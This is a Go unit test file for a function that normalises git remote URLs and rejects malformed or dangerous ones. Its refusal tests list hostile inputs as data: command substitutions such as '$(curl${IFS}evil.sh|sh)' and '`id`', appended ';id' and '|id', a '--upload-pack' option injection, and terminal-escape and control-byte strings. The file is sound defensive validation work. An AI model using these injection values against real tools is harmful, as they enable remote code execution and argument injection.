package origin

import (
	"strings"
	"testing"
)

func TestIdentity(t *testing.T) {
	cases := []struct{ in, want string }{
		{"git@gitlab.com:Dig/api.git", "gitlab.com/dig/api"},
		{"ssh://git@gitlab.com:2222/dig/api.git", "gitlab.com/dig/api"},
		{"https://gitlab.com/dig/api", "gitlab.com/dig/api"},
		{"https://user:token@gitlab.com/dig/api.git/", "gitlab.com/dig/api"},
		{"git://github.com/org/repo", "github.com/org/repo"},
		{"gitlab.com:dig/front/api.git", "gitlab.com/dig/front/api"},
		{"git@host:2222/dig/api", "host/2222/dig/api"},
		{"HTTPS://GitLab.com/Dig/API.GIT", "gitlab.com/dig/api"},
	}
	for _, c := range cases {
		got, err := Identity(c.in)
		if err != nil {
			t.Errorf("Identity(%q) error: %v", c.in, err)
			continue
		}
		if got != c.want {
			t.Errorf("Identity(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestIdentityRefuses(t *testing.T) {
	for _, in := range []string{"/abs/path", "../rel", "file:///x/y", "", "https://host", "ftp://h/a", "https://u:secret@host", "user:tok@host:dig/api", "user:tok@host/dig/api"} {
		_, err := Identity(in)
		if err == nil {
			t.Errorf("Identity(%q) = nil error, want refusal", in)
			continue
		}
		if msg := err.Error(); len(in) > 0 && strings.Contains(msg, in) {
			t.Errorf("Identity(%q) error echoes the input: %q", in, msg)
		}
	}
}

func TestIdentityRefusesControlBytesAndWhitespace(t *testing.T) {
	for _, in := range []string{
		"git@gitlab.com:dig/a\rpi",
		"host:x/\x1b[1;1fover",
		"host:dig/a\x00b",
		"host:dig/a\tb",
		"host:dig/a b",
		"host:dig/a\x7fb",
		"https://host/a%0db",
		"https://host/a%1b[2Jb",
		"https://host/a%20b",
		"ssh://git@host/dig/a%09b",
		"git@ho st:dig/api",
		"https://github.com/org/%E2%80%AEoper",
		"host:dig/a\u200bb",
		"host:dig/a\xffb",
	} {
		if id, err := Identity(in); err == nil {
			t.Errorf("Identity(%q) = %q, want refusal", in, id)
		} else if err != errNotRemote {
			t.Errorf("Identity(%q) error %v, want the constant refusal", in, err)
		}
	}
}

func TestIdentityRefusesShellCharacters(t *testing.T) {
	for _, in := range []string{
		"$(curl${IFS}evil.sh|sh)@github.com:org/repo",
		"`id`@github.com:org/repo",
		"https://$(id)@github.com/org/repo",
		"--upload-pack=x@github.com:org/repo",
		"~me@github.com:org/repo",
		"github.com:org/a;id",
		"github.com:org/a|id",
		"github.com:org/'a'",
		"https://github.com/org/a%24(id)",
	} {
		if id, err := Identity(in); err == nil {
			t.Errorf("Identity(%q) = %q, want refusal", in, id)
		} else if strings.Contains(err.Error(), in) {
			t.Errorf("Identity(%q) error echoes the input: %q", in, err)
		}
	}
}

func TestIdentityKeepsCommonRemoteForms(t *testing.T) {
	for _, in := range []string{
		"ssh://git@gitlab.com:2222/~me/api.git",
		"https://oauth2:glpat-x_Y.z@gitlab.com/dig/api",
		"git@github.com:org/my-repo_2.git",
		"https://host/org/caf%C3%A9",
	} {
		if _, err := Identity(in); err != nil {
			t.Errorf("Identity(%q): %v", in, err)
		}
	}
}
